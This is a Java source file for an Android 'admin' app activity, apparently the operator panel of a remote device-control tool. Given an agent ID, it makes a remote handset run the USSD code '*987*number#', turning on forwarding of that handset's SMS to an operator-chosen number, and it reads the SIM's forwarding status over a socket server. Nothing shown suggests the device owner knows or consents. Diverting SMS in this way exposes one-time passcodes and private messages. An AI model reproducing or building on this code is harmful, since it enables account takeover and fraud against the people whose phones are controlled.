package com.pegalite.neotronadmin.ui;

import static android.view.View.GONE;
import static android.view.View.VISIBLE;

import android.os.Bundle;
import android.widget.Toast;

import com.pegalite.alerts.dialog.PegaSuccessDialog;
import com.pegalite.alerts.utils.DialogData;
import com.pegalite.neotronadmin.databinding.ActivitySmsForwardingBinding;
import com.pegalite.neotronadmin.functions.alerts.SendingDialog;
import com.pegalite.neotronadmin.functions.helpers.Prefs;
import com.pegalite.neotronadmin.functions.server.socket.PegaSocketServer;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAnimationManager;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;

import org.json.JSONObject;

import java.util.Objects;

import io.socket.client.Ack;

public class SmsForwardingActivity extends PegaAppCompatActivity {

    ActivitySmsForwardingBinding binding;

    String smsUSSD = "*987*number#";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivitySmsForwardingBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();
        setBackWithRightAnim();

        binding.back.setOnClickListener(v -> getOnBackPressedDispatcher().onBackPressed());

        String agentID = getIntent().getStringExtra("agentID");
        String deviceName = getIntent().getStringExtra("deviceName");
        binding.title.setText(deviceName);

        binding.send.setOnClickListener(v -> {
            String number = binding.number.getText().toString();

            if (number.isBlank()) {
                PegaAnimationManager.shake(binding.number);
                Toast.makeText(this, "Enter An Valid Number Code", Toast.LENGTH_SHORT).show();
                return;
            }

            sendUSSD(agentID, smsUSSD.replace("number", number));

        });

        PegaSocketServer.getSocket().emit("get_sim_status", agentID, (Ack) args -> {
            runOnUiThread(() -> {
                JSONObject data = (JSONObject) args[0];
                binding.progress.setVisibility(GONE);
                if (data.optString("status").equals("success")) {
                    binding.detailsContainer.setVisibility(VISIBLE);
                    String number = Objects.requireNonNull(data.optJSONObject("configs")).optString("sms-forward");
                    if (!number.equals(Prefs.NO_DATA)) {
                        binding.number.setText(number);
                    }
                } else {
                    binding.errorMessage.setVisibility(VISIBLE);
                    binding.errorMessage.setText(data.optString("msg"));
                }
            });
        });


    }

    private void sendUSSD(String agentID, String ussd) {
        SendingDialog sendingDialog = new SendingDialog(getActivity(), DialogData.UN_CANCELABLE);
        sendingDialog.show("Adding Number...");
        addDialogToDestroyList(sendingDialog);
        PegaSocketServer.getSocket().emit("run-ussd", agentID, ussd, 0, (Ack) args -> {
            runOnUiThread(() -> {
                sendingDialog.dismiss();
                JSONObject data = (JSONObject) args[0];
                if (data.optString("status").equals("success")) {
                    PegaSuccessDialog successDialog = new PegaSuccessDialog(getActivity(), DialogData.DISMISS_ON_CANCEL);
                    successDialog.show("Offline SMS Forwarding Enabled!");
                    addDialogToDestroyList(sendingDialog);
                } else {
                    binding.detailsContainer.setVisibility(GONE);
                    binding.errorMessage.setVisibility(VISIBLE);
                    binding.errorMessage.setText(data.optString("msg"));
                }
            });
        });

    }
}